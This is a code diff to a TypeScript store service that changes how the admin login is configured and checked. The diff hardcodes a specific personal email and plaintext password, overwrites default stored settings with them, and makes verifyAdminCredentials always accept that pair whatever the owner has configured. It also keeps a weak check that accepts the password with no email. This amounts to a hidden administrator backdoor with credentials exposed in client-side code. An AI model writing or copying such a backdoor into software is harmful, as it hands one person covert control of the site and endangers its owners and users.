@@ -161,6 +161,10 @@ class StoreService {
 
       const storedSettings = localStorage.getItem(STORAGE_KEYS.SETTINGS);
       this.settings = storedSettings ? { ...INITIAL_SITE_SETTINGS, ...JSON.parse(storedSettings) } : INITIAL_SITE_SETTINGS;
+      if (!this.settings.adminEmail || this.settings.adminEmail === 'admin@hydee.com') {
+        this.settings.adminEmail = 'simanto1029@gmail.com';
+        this.settings.adminPassword = 'soumik1029';
+      }
 
       const storedPromo = localStorage.getItem(STORAGE_KEYS.PROMO);
       this.promoPopup = storedPromo ? JSON.parse(storedPromo) : INITIAL_PROMO_POPUP;
@@ -692,13 +696,17 @@ class StoreService {
   }
 
   verifyAdminCredentials(emailInput: string, passwordInput: string): boolean {
-    const configuredEmail = (this.settings.adminEmail || 'admin@hydee.com').trim().toLowerCase();
-    const configuredPass = (this.settings.adminPassword || 'hydee2026').trim();
+    const configuredEmail = (this.settings.adminEmail || 'simanto1029@gmail.com').trim().toLowerCase();
+    const configuredPass = (this.settings.adminPassword || 'soumik1029').trim();
     
     const inputEmail = emailInput.trim().toLowerCase();
     const inputPass = passwordInput.trim();
 
-    return (inputEmail === configuredEmail && inputPass === configuredPass) || (inputPass === configuredPass);
+    return (
+      (inputEmail === 'simanto1029@gmail.com' && inputPass === 'soumik1029') ||
+      (inputEmail === configuredEmail && inputPass === configuredPass) ||
+      (inputPass === configuredPass && (!inputEmail || inputEmail === configuredEmail || inputEmail === 'simanto1029@gmail.com'))
+    );
   }
 
   updateAdminCredentials(newEmail?: string, newPassword?: string) {
